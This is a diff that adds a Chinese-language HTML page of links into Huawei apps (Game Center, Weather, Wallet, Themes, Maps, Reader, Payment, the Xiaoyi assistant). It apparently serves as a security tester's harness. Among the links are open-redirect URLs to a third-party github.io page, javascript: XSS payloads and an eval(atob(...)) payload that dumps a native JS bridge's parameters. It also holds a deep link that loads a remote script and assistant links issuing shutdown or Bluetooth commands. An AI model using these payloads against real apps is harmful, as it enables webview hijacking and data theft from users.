@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>功能链接集合</title>
+    <style>
+        /* --- CSS 优化 --- */
+        /* 使用 :root 伪类定义全局变量，方便统一修改 */
+        :root {
+            --font-size-base: 16px;
+            --font-size-link: 1.1rem;
+            --color-text: #333;
+            --color-link: #007bff;
+            --color-link-hover: #0056b3;
+            --bg-color: #f8f9fa;
+            --card-bg: #fff;
+            --spacing-sm: 0.5rem;
+            --spacing-md: 1rem;
+            --spacing-lg: 2rem;
+            --border-radius: 8px;
+            --box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            font-size: var(--font-size-base);
+            line-height: 1.6;
+            color: var(--color-text);
+            background-color: var(--bg-color);
+            padding: var(--spacing-lg);
+        }
+
+        header {
+            margin-bottom: var(--spacing-lg);
+            text-align: center;
+        }
+
+        h1 {
+            color: #212529;
+        }
+        
+        .page-description {
+            color: #6c757d;
+            margin-top: var(--spacing-sm);
+        }
+
+        main {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        /* 使用 CSS Grid 布局，更灵活地控制卡片排列 */
+        .link-cards-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: var(--spacing-md);
+        }
+
+        .card {
+            background-color: var(--card-bg);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-md);
+            box-shadow: var(--box-shadow);
+            transition: transform 0.2s ease-in-out;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+        }
+
+        .card-title {
+            font-size: 1.3rem;
+            margin-bottom: var(--spacing-md);
+            padding-bottom: var(--spacing-sm);
+            border-bottom: 1px solid #e9ecef;
+        }
+        
+        /* 将所有链接样式统一管理 */
+        .function-link {
+            display: block;
+            padding: var(--spacing-sm) var(--spacing-md);
+            margin-bottom: var(--spacing-sm);
+            background-color: #e9ecef;
+            color: var(--color-link);
+            text-decoration: none;
+            border-radius: 4px;
+            transition: background-color 0.2s, color 0.2s;
+            font-size: var(--font-size-link);
+            text-align: center;
+        }
+
+        .function-link:hover {
+            background-color: var(--color-link);
+            color: white;
+            text-decoration: none;
+        }
+
+        footer {
+            margin-top: var(--spacing-lg);
+            text-align: center;
+            color: #6c757d;
+            font-size: 0.9rem;
+        }
+
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>功能链接导航</h1>
+        <p class="page-description">以下是按不同场景分类的功能链接集合</p>
+    </header>
+
+    <main>
+        <div class="link-cards-container" id="linkContainer">
+            <!-- 卡片内容将通过 JavaScript 动态生成 -->
+        </div>
+    </main>
+
+    <footer>
+        <p>© 2024 功能链接集合</p>
+    </footer>
+
+    <script>
+        // --- JavaScript 优化 ---
+        // 1. 数据与视图分离：将所有链接数据组织成一个 JavaScript 对象数组。
+        //    这样做的好处是：易于修改、易于扩展、可以被其他脚本复用。
+        const linkData = [
+            {
+                category: "游戏中心 contentcenter-drcn.dbankcdn.cn",
+                links: [
+                    { name: "游戏中心", url: "https://game.cloud.huawei.com/gc/link/html?url=https://contentcenter-drcn.dbankcdn.cn/pub_1/GameCenter_jforum_900_9/c6/v3/10013037847025486536713_v7/3037849859183443974.html" }                 
+                ]
+            },
+            {
+                category: "h5hosting-drcn.dbankcdn.cn with console",
+                links: [
+                    { name: "游戏中心", url: "https://game.cloud.huawei.com/gc/link/html?url=https://h5hosting-drcn.dbankcdn.cn/sandbox/cch5/huaweipay/marketAction_nov24_harmonyAct/index.html" },
+                    { name: "天气", url: "https://weather-drcn.weather.dbankcloud.cn/index.html?enterType=typhoon&url=https://h5hosting-drcn.dbankcdn.cn/sandbox/cch5/huaweipay/marketAction_nov24_harmonyAct/index.html?name=cc" },
+                    { name: "钱包", url: "https://wallet.cloud.huawei.com?biz=WalletCommon&action=commonH5&url=https://h5hosting-drcn.dbankcdn.cn/sandbox/cch5/huaweipay/marketAction_nov24_harmonyAct/index.html?name=cc&title=" },
+                    { name: "主题", url: "https://h5hosting-drcn.dbankcdn.cn/cch5/global-themes-userPortal/index.html?page=web_page&url=https://h5hosting-drcn.dbankcdn.cn/sandbox/cch5/huaweipay/marketAction_nov24_harmonyAct/index.html" },
+                    { name: "地图", url: "https://www.petalmaps.com/activity?utm_source=fb&url=https://h5hosting-drcn.dbankcdn.cn/sandbox/cch5/huaweipay/marketAction_nov24_harmonyAct/index.html" },
+                     { name: "阅读", url: "hwread://com.huawei.hmsapp.books/main/campaign?campaignUrl=https://h5hosting-drcn.dbankcdn.cn/cch5/HiCare/business-deepLink/deepLink/index.html?type%3DopenH5Page%26url%3DjavaScript%3As%3Ddocument.createElement(%27script%27)%2Cs.src%3D%27https%3A%2F%2Fseuercc.github.io%2F26%2Fcloudx.js%27%2Cs.onload%3D()%3D%3Ealert(%27JS%27)%2Cdocument.head.appendChild(s)" },
+                     { name: "支付", url: "paymentkit://com.huawei.hms.payment/user?pageCode=webview&activityCode=46458859&url=https://seuercc.github.io/26/cloudx.html" },
+                ]
+            },
+            {
+                category: "h5hosting-drcn.dbankcdn.cn 花瓣测速",
+                links: [
+                    { name: "游戏中心", url: "https://game.cloud.huawei.com/gc/link/html?url=https://h5hosting-drcn.dbankcdn.cn/cch5/petalspeed/guideResource/index.html" },
+                    { name: "天气", url: "https://weather-drcn.weather.dbankcloud.cn/index.html?enterType=typhoon&url=https://h5hosting-drcn.dbankcdn.cn/cch5/petalspeed/guideResource/index.html?name=cc" },
+                    { name: "钱包", url: "https://wallet.cloud.huawei.com?biz=WalletCommon&action=commonH5&url=https://h5hosting-drcn.dbankcdn.cn/cch5/petalspeed/guideResource/index.html?name=cc&title=" },
+                    { name: "主题", url: "https://h5hosting-drcn.dbankcdn.cn/cch5/global-themes-userPortal/index.html?page=web_page&url=https://h5hosting-drcn.dbankcdn.cn/cch5/petalspeed/guideResource/index.html" },
+                    { name: "地图", url: "https://www.petalmaps.com/activity?utm_source=fb&url=https://h5hosting-drcn.dbankcdn.cn/cch5/petalspeed/guideResource/index.html" }
+                ]
+            },
+            {
+                category: "h5hosting-drcn.dbankcdn.cn/cch5/PPS 重定向到百度",
+                links: [
+                    { name: "游戏中心", url: "https://game.cloud.huawei.com/gc/link/html?url=https://h5hosting-drcn.dbankcdn.cn/cch5/PPS/ssp-privacy-url/index.html?src=https://www.baidu.com" },
+                    { name: "天气", url: "https://weather-drcn.weather.dbankcloud.cn/index.html?enterType=typhoon&url=https://h5hosting-drcn.dbankcdn.cn/cch5/PPS/ssp-privacy-url/index.html?src=https://www.baidu.com?name=cc" },
+                    { name: "钱包", url: "https://wallet.cloud.huawei.com?biz=WalletCommon&action=commonH5&url=https://h5hosting-drcn.dbankcdn.cn/cch5/PPS/ssp-privacy-url/index.html?src=https://www.baidu.com?name=cc&title=" },
+                    { name: "主题", url: "https://h5hosting-drcn.dbankcdn.cn/cch5/global-themes-userPortal/index.html?page=web_page&url=https://h5hosting-drcn.dbankcdn.cn/cch5/PPS/ssp-privacy-url/index.html?src=https://www.baidu.com?immersive=true&closeForceDark=true" },
+                    { name: "地图", url: "https://www.petalmaps.com/activity?utm_source=fb&url=https://h5hosting-drcn.dbankcdn.cn/cch5/PPS/ssp-privacy-url/index.html?src=https://www.baidu.com" }
+                ]
+            },
+            {
+                category: "h5hosting-drcn.dbankcdn.cn/cch5/PPS 重定向到 cc",
+                links: [
+                    { name: "游戏中心", url: "https://game.cloud.huawei.com/gc/link/html?url=https://h5hosting-drcn.dbankcdn.cn/cch5/PPS/ssp-privacy-url/index.html?src=https://seuercc.github.io/easyhtml/showjsnew.html" },
+                    { name: "天气", url: "https://weather-drcn.weather.dbankcloud.cn/index.html?enterType=typhoon&url=https://h5hosting-drcn.dbankcdn.cn/cch5/PPS/ssp-privacy-url/index.html?src=https://seuercc.github.io/easyhtml/showjsnew.html?name=cc" },
+                    { name: "钱包", url: "https://wallet.cloud.huawei.com?biz=WalletCommon&action=commonH5&url=https://h5hosting-drcn.dbankcdn.cn/cch5/PPS/ssp-privacy-url/index.html?src=https://seuercc.github.io/easyhtml/showjsnew.html?name=cc&title=" },
+                    { name: "主题", url: "https://h5hosting-drcn.dbankcdn.cn/cch5/global-themes-userPortal/index.html?page=web_page&url=https://h5hosting-drcn.dbankcdn.cn/cch5/PPS/ssp-privacy-url/index.html?src=https://seuercc.github.io/easyhtml/showjsnew.html?immersive=true&closeForceDark=true" },
+                    { name: "地图", url: "https://www.petalmaps.com/activity?utm_source=fb&url=https://h5hosting-drcn.dbankcdn.cn/cch5/PPS/ssp-privacy-url/index.html?src=https://seuercc.github.io/easyhtml/map.html" }
+                ]
+            },
+            {
+                category: "https://h5hosting-drcn.dbankcdn.cn/cch5/ScenarizedDist 重定向到 cc",
+                links: [
+                    { name: "游戏中心", url: "https://game.cloud.huawei.com/gc/link/html?url=https://h5hosting-drcn.dbankcdn.cn/cch5/ScenarizedDist/filePage/dist/index.html#/filePageMain?id=YhiWEn2PAPTw9L7JbhFiYhIFpmpef8gH/P5B67Umb/s=&language=zh_CN&url=https://seuercc.github.io/easyhtml/showjsnew.html" },
+                    { name: "天气", url: "https://weather-drcn.weather.dbankcloud.cn/index.html?enterType=typhoon&url=https://h5hosting-drcn.dbankcdn.cn/cch5/ScenarizedDist/filePage/dist/index.html#/filePageMain?id=YhiWEn2PAPTw9L7JbhFiYhIFpmpef8gH/P5B67Umb/s=&language=zh_CN&url=javascript:document.write('xss')//?name=cc" },
+                    { name: "钱包", url: "https://wallet.cloud.huawei.com?biz=WalletCommon&action=commonH5&url=https://h5hosting-drcn.dbankcdn.cn/cch5/ScenarizedDist/filePage/dist/index.html#/filePageMain?id=YhiWEn2PAPTw9L7JbhFiYhIFpmpef8gH/P5B67Umb/s=&language=zh_CN&url=javascript:document.write('xss')//?name=cc&title=" },
+                    { name: "主题", url: "https://h5hosting-drcn.dbankcdn.cn/cch5/global-themes-userPortal/index.html?page=web_page&url=https://h5hosting-drcn.dbankcdn.cn/cch5/ScenarizedDist/filePage/dist/index.html%23%2FfilePageMain%3Fid%3Dsww%2BsNgyGsxLB%2BVgDku8rswI5V4hLmFtRFTAlklxoWQ%3D%26language%3Dzh_CN%26url%3Djavascript%253Aeval%2528atob%2528%2522ZG9jdW1lbnQud3JpdGUoSlNPTi5zdHJpbmdpZnkod2luZG93LkpzSW50ZXJmYWNlLmdldFBhcmFtcygpLCBudWxsLCAyKSk%253D%2522%2529%2529"},
+                    { name: "地图", url: "https://www.petalmaps.com/activity?utm_source=fb&url=https://h5hosting-drcn.dbankcdn.cn/cch5/ScenarizedDist/filePage/dist/index.html#/filePageMain?id=YhiWEn2PAPTw9L7JbhFiYhIFpmpef8gH/P5B67Umb/s=&language=zh_CN&url=javascript:document.write('xss')" }
+                ]
+            },
+            {
+                category: "其他应用AppLinking",
+                links: [
+                    { name: "华为视频", url: "https://drcn.video.cloud.huawei.com/nsp-campaign-res-drcn/campaignpreview/6579f67d9f914859b39dd48939ec4913/index.html?viewsId=0" },
+                    { name: "音乐", url: "https://portal-drcn.music.cloud.huawei.com/music-aop-h5/index.html?creativeCubeUrl=https://ug-drcn.media.dbankcloud.cn/nsp-campaign-res-drcn/campaignpreview/3a7839657308425794ea3bfe8febcb66/index.html?srcChannel=902&activityCode=506,fromPage&viewsId=0" },
+                    { name: "音乐2", url: "https://portal-drcn.music.cloud.huawei.com/music-aop-h5/index.html?creativeCubeUrl=https://game.cloud.huawei.com/gc/link/html?url=https://seuercc.github.io/easyhtml/showjsnew.html" },
+                    { name: "负一屏鸿蒙有礼", url: "https://distribution-drcn.ai.dbankcloud.cn/HarmonyOffering" },
+                    { name: "阅读 (H5)", url: "https://h5hosting-drcn.dbankcdn.cn/cch5/hwread/campaign?campaignId=275400" },
+                    { name: "阅读 (App)", url: "hwread://com.huawei.hmsapp.books/main/campaign?campaignId=275400" },
+                    { name: "阅读 AppLinking ug-drcn.media.dbankcloud.cn", url: "https://ug-drcn.media.dbankcloud.cn/nsp-campaign-res-drcn/campaignpreview/HuaweiRead-6be52214ea624ab9a47a6510f469a3a1/index.html?viewsId=0" },
+                    { name: "小艺1", url: "https://h5hosting-drcn.dbankcdn.cn/cch5/HiVoice/h5-hosting-portal/agent/index.html" },
+                    { name: "小艺2", url: "https://celia.cloud.huawei.com/launch?text=打开vassistant://voice/main?text=确认关机&intent=QAtest&id=1&agentName=xiaoyi" },
+                    { name: "小艺3", url: "https://celia.cloud.huawei.com/launch?text=帮我确认重启手机&intent=QAtest&id=1&agentName=xiaoyi" },
+                    { name: "小艺Deeplink", url: "vassistant://voice/main?text=关闭蓝牙" },
+                    { name: "打开小游戏", url: "https://game.cloud.huawei.com/mge/link/rungame?packageName=com.elsfkww.xyx.huawei" }, 
+                    { name: "小艺音乐搭子", url: "https://xiaoyi.huawei.com/?agentId=agent56f752c56524484d9867f077169b8e6a" },
+                      { name: "玩机助手", url: "https://xiaoyi.huawei.com/?agentId=agentdf795666f44f4d469325362a45daafcc" },
+                      { name: "小艺创意画室", url: "https://xiaoyi.huawei.com/?agentId=agentf807f8723f1747cebf6fb579c95fe359" },
+                      { name: "小艺深度解题", url: "https://xiaoyi.huawei.com/?agentId=skillHostingdd7c2bfa6d4f4f16b5210e51bd689c88" },
+                      { name: "小艺时光机", url: "https://xiaoyi.huawei.com/?agentId=celia_journal" },
+                      { name: "小艺知识库", url: "https://xiaoyi.huawei.com/?agentId=celia_collection" },
+                      { name: "小艺翻译助手", url: "https://xiaoyi.huawei.com/?agentId=agent2b611dfbf4b34d55b302b4ef5ab6e8b6" },
+                      { name: "小艺深度研究", url: "https://xiaoyi.huawei.com/?agentId=agent587b8aa450624475b2bd3d8fcedd55a8" },
+                      { name: "小艺高考通", url: "https://xiaoyi.huawei.com/?agentId=agent47bab76aec584b6bb393a6cea11f2559" },
+                      { name: "小艺深度研究", url: "https://xiaoyi.huawei.com/?agentId=agent2b86e4e72c1c4565b08c0fe14024eb42" },
+                      { name: "小艺照相馆", url: "https://xiaoyi.huawei.com/?agentId=agenta522cf34d21c4ddaa6a157ac26676a86" },
+                      { name: "小艺慧记", url: "https://xiaoyi.huawei.com/?agentId=skillHostingagent7daa2235d05244cd8be8ae68d827c754" },
+                      { name: "小艺翻译助手", url: "https://xiaoyi.huawei.com/?agentId=agent20250115006" },
+                      { name: "小艺文档助理", url: "https://xiaoyi.huawei.com/?agentId=agent3fe27d2ddf7c4c239f1058562d675ed1" },
+                      { name: "小艺慧记", url: "https://xiaoyi.huawei.com/?agentId=agent21c33118b88c43ccb8187bf0faf04cc0" },
+                      { name: "DeepSeek-R1", url: "https://xiaoyi.huawei.com/?agentId=agent72acbb128de54068b8a725e963eb3d88" },
+                      { name: "口语练习生 Kathy", url: "https://xiaoyi.huawei.com/?agentId=Agentpeilian123" },
+                      { name: "小艺照相馆", url: "https://xiaoyi.huawei.com/?agentId=agent8256f89b64694c1f97680ead2e5fb6fd" },
+                      { name: "帮你写文案", url: "https://xiaoyi.huawei.com/?agentId=agent06df037b88c44bbeae5e9b4fcbfcbedc" },
+                      { name: "小艺开放平台小助手", url: "https://xiaoyi.huawei.com/?agentId=agent5d0ebc46c82e40afa672b220fa584a11" },
+                      { name: "口语练习生Kathy", url: "https://xiaoyi.huawei.com/?agentId=agent11653af403d347c1bdf2a79fe2beb0dd" },
+                      { name: "小艺运动健康", url: "https://xiaoyi.huawei.com/?agentId=agent4c9624e9cb2e4299807f377f1c36d365" },
+                      { name: "小艺任务空间", url: "https://xiaoyi.huawei.com/?agentId=agentf5850a52a9b6417bb71dcdba7a42a5df" },
+                      { name: "文档助理", url: "https://xiaoyi.huawei.com/?agentId=skillHosting3fe27d2ddf7c4c239f1058562d675ed1_pc" },
+                      { name: "小艺修图", url: "https://xiaoyi.huawei.com/?agentId=agentd2587655c39941f28b816c831725f8a3" },
+                      { name: "小艺通话助手", url: "https://xiaoyi.huawei.com/?agentId=skillHostingsdasdaasda8787das8sd4s8dsa4a" },
+                      { name: "小艺帮我做", url: "https://xiaoyi.huawei.com/?agentId=skillHosting80ba57ff4a884289aee0c929dfd5dc18" },
+                      { name: "小艺乐队", url: "https://xiaoyi.huawei.com/?agentId=agent2fae09dd4ee24ece98e38ee8d937f27b" },
+                      { name: "小艺当当当", url: "https://xiaoyi.huawei.com/?agentId=agent7f6d4b59a99b4ef88b9fc50b91a97f66" },
+                      { name: "潘多拉", url: "https://xiaoyi.huawei.com/?agentId=agentf264a404443f481eb14fb06bd45630f4" },
+                      { name: "DevEco-V3-ArkTs", url: "https://xiaoyi.huawei.com/?agentId=agent10f98745220a437da2c511dadea12059" },
+                      { name: "HDC小助手", url: "https://xiaoyi.huawei.com/?agentId=agentfd58b916d432411a9ae6106c8fb07482" },
+                      { name: "小艺玩机助手", url: "https://xiaoyi.huawei.com/?agentId=skillHosting1256ff9b6g694c3fsdawq06ad2752132ac" },
+                      { name: "美食大侦探", url: "https://xiaoyi.huawei.com/?agentId=agent7b1d5944ebef4f52ba847e2028f5f800" },
+                      { name: "DeepSeek-V3-CeliaKBD", url: "https://xiaoyi.huawei.com/?agentId=agent2773869c5b0b40f38aed8a1df3d4898e" },
+                      { name: "DeepSeek-R1-CeliaKBD", url: "https://xiaoyi.huawei.com/?agentId=agent3755bb35f50d4b72bc757f69947427c3" },
+                      { name: "意图调试助手", url: "https://xiaoyi.huawei.com/?agentId=agent265e6623e6324df39bdfd0238b7196fc" },
+                      { name: "歌曲作词大师", url: "https://xiaoyi.huawei.com/?agentId=agenteb772a71e766401a85f53060d5d7e1b9" },
+                      { name: "活泼开朗的小佳", url: "https://xiaoyi.huawei.com/?agentId=skillHosting0684fea10c5141e2932de082970a2465" },
+                      { name: "小艺速办", url: "https://xiaoyi.huawei.com/?agentId=skillHostingbe201c36995442f0a2f92085d2e904cd" },
+                      { name: "DevEco-DeepSeek", url: "https://xiaoyi.huawei.com/?agentId=agentbc9406f7136c4a54943ac8a00183f2fb" },
+                      { name: "DevEco-DeepSeek-V3", url: "https://xiaoyi.huawei.com/?agentId=agent203378e8500049d5a6634fcd3b38b8dc" },
+                ]
+            }
+        ];
+
+        // 2. 动态生成 DOM：编写一个函数来遍历数据并创建 HTML 元素。
+        function renderLinks() {
+            const container = document.getElementById('linkContainer');
+            
+            // 如果容器不存在，则停止执行
+            if (!container) return;
+
+            linkData.forEach(categoryData => {
+                // 创建卡片 (Card) 元素
+                const card = document.createElement('div');
+                card.className = 'card';
+
+                // 创建卡片标题
+                const cardTitle = document.createElement('h3');
+                cardTitle.className = 'card-title';
+                cardTitle.textContent = categoryData.category;
+                card.appendChild(cardTitle);
+
+                // 创建链接列表
+                categoryData.links.forEach(linkInfo => {
+                    const link = document.createElement('a');
+                    link.className = 'function-link'; // 使用更语义化的类名
+                    link.textContent = linkInfo.name;
+                    link.href = linkInfo.url;
+                    // 添加 target="_blank" 使链接在新标签页打开，提升用户体验
+                    link.target = "_blank";
+                    link.rel = "noopener noreferrer"; // 安全建议
+                    card.appendChild(link);
+                });
+
+                // 将卡片添加到页面容器中
+                container.appendChild(card);
+            });
+        }
+
+        // 3. 页面加载完成后执行渲染函数
+        // 使用 DOMContentLoaded 事件确保 HTML 结构已完全加载
+        document.addEventListener('DOMContentLoaded', renderLinks);
+    </script>
+
+</body>
+</html>
